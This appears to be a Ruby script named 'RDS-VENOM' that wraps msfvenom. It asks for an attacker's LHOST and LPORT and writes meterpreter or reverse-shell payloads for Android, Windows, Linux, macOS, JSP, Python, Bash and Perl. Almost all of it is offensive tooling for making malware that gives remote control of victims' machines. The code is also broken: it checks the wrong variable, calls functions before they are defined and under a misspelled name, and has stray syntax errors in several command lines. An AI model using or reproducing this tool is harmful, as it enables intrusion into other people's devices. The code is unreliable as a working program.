#!/usr/bin/ruby
system("clear")
require 'colorize'

puts "

██▒   █▓▓█████  ███▄    █  ▒█████   ███▄ ▄███▓
▓██░   █▒▓█   ▀  ██ ▀█   █ ▒██▒  ██▒▓██▒▀█▀ ██▒
 ▓██  █▒░▒███   ▓██  ▀█ ██▒▒██░  ██▒▓██    ▓██░
  ▒██ █░░▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░▒██    ▒██
   ▒▀█░  ░▒████▒▒██░   ▓██░░ ████▓▒░▒██▒   ░██▒
   ░ ▐░  ░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ░  ░
   ░ ░░   ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░  ░      ░
     ░░     ░      ░   ░ ░ ░ ░ ░ ▒  ░      ░
      ░     ░  ░         ░     ░ ░         ░
     ░

".red
puts "                                [ payload generator]".green
puts "|| RDS-VENOM V.01||".red
puts "                                [code by spy]".green
puts
def ban()
    puts "[1] Android".green
    puts "[2] Windos ".green
    puts "[3] Linux ".green
    puts "[4] Mac ".green  
    puts "[5] jsp".green
    puts "[6] Python ".green
    puts "[7] Bash ".green
    puts "[8] Perl ".green
    puts "[9] menu".green 
end 
    ban()

puts " please enter your option >>".red
option = gets.chomp
puts
puts

 if $option == "1" then
andriod()
elsif $option == "2" then
window()   
elsif $option == "3" then
linux()   
elsif $option == "4" then
mc()
elsif $option == "5" then
jsp()
elsif $option == "6" then
python()
elsif $option == "7" then
bash()
elsif $option == "8" then   
perl()
elsif $option == "9" then
menu()

else

puts "[Error ,please select a from the above the list ".red

end


def andriod()

puts " Enter Your LHOST :"

lhost = gets.chomp

puts
puts " Enter Your LPORT:"
lport = gets.chomp
puts

puts " Enter Your file location ":
location = gets.chomp
puts

puts " Enter your payload Name :"
name = gets.chomp
system("msfvenom -p android/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} R > #{location}/#{name}").apk>
puts
puts "[*] Payload successfully created ".cyan
end

def window()

puts " Enter Your LHOST :"

lhost = gets.chomp

puts
puts " Enter Your LPORT:"
lport = gets.chomp
puts

puts " Enter Your file location ":
location = gets.chomp
puts

puts " Enter your payload Name :"
name = gets.chomp
puts

system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe –o #{location}/#{name}.exe")
puts
puts "[*] Payload successful created ".cyan
end

def linux()

puts " Enter Your LHOST :"

lhost = gets.chomp

puts
puts " Enter Your LPORT:"
lport = gets.chomp
puts

puts " Enter Your file location ":
location = gets.chomp
puts

puts " Enter your payload Name :"
name = gets.chomp
puts

system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} elf > #{location}/#{name}.elf") 

puts "[*] Payload successful created ".cyan
end

def mac()

puts " Enter Your LHOST :"                                                              
lhost = gets.chomp
                                                                                        
puts " Enter Your LPORT:"
lport = gets.chomp
puts

puts " Enter Your file location ":
location = gets.chomp
puts

puts " Enter your payload Name :"
name = gets.chomp
puts

system("msfvenom -p osx/x86/shell_reverse_tcp LHOST=#{lhost} LPORT=#{lport} f macho > #{location}/#{name}.macho")

puts
puts "[*] Payload successfully created ".cyan
end

def jsp()

puts " Enter Your LHOST :"                                                              
lhost = gets.chomp
                                                                                        
puts " Enter Your LPORT:"
lport = gets.chomp
puts

puts " Enter Your file location ":
location = gets.chomp
puts

puts " Enter your payload Name :"
name = gets.chomp
puts

system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f raw > #{location}/#{name}.jsp")

 
puts
puts "[*] Payload successfully created ".cyan
end

def python()

puts " Enter Your LHOST :"                                                              
lhost = gets.chomp
                                                                                        puts
puts " Enter Your LPORT:"
lport = gets.chomp
puts

puts " Enter Your file location ":
location = gets.chomp
puts

puts " Enter your payload Name :"
name = gets.chomp
puts

system("msfvenom -p cmd/unix/reverse_python LHOST=#{lhost} LPORT=#{lport} -f raw > #{location}/#{name}.py")

puts
puts "[*] Payload successfully created ".cyan

end

def bash() 

puts " Enter Your LHOST :"                                                              
lhost = gets.chomp
                                                                                        puts
puts " Enter Your LPORT:"
lport = gets.chomp
puts

puts " Enter Your file location ":
location = gets.chomp
puts

puts " Enter your payload Name :"
name = gets.chomp
puts

system("msfvenom -p cmd/unix/reverse_bash LHOST=#{lhost} LPORT=#{lport} -f raw > #{location}/#{name}.sh")

puts
puts "[*] Payload successfully created ".cyan

end

def perl()

puts " Enter Your LHOST :"                                                              
lhost = gets.chomp
                                                                                        puts
puts " Enter Your LPORT:"
lport = gets.chomp
puts

puts " Enter Your file location ":
location = gets.chomp
puts

puts " Enter your payload Name :"
name = gets.chomp
puts

system("msfvenom -p cmd/unix/reverse_perl LHOST=#{lhost} LPORT=#{lport} -f  raw > #{location}/#{name}.pl")

puts
puts "[*] Payload successfully created ".cyan

end

def menu()
#menu
puts "[*]menu".green
end

